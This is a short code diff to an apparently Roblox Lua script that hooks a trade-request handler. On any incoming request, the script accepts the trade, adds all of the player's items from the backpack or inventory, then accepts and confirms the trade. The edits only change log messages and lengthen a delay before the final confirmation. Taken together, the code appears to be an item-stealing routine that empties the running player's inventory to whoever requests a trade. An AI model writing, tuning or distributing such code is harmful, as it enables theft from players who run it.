@@ -69,7 +69,7 @@ SendRequest.OnClientInvoke = function(senderPlayer)
         end)
         
         task.spawn(function()
-            print("Trade accepted! Waiting 1 second before offering items...")
+            print("Trade accepted! Waiting 1 second before adding all items...")
             task.wait(1)
             
             pcall(function()
@@ -156,8 +156,8 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                 warn("Mobile inventory container path not found; pulled " .. tostring(offeredCount) .. " items from Backpack instead.")
             end
 
-            print("Finished offering all weapons. Waiting 6 seconds...")
-            task.wait(6)
+            print("Finished adding items. Waiting 8 seconds before accepting and confirming trade...")
+            task.wait(8)
 
             pcall(function()
                 AcceptTradeEvent:FireServer(true)
